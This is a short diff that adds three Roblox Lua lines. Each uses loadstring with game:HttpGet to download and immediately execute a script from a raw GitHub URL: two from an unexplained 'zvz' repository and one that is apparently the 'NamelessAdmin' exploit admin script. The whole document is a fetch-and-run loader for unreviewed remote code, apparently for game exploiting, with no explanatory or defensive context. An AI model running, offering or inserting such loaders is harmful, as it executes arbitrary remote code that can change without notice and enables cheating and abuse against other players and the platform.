@@ -1,0 +1,3 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/8jke/zvz/refs/heads/main/vc'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/8jke/zvz/refs/heads/main/vc1'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
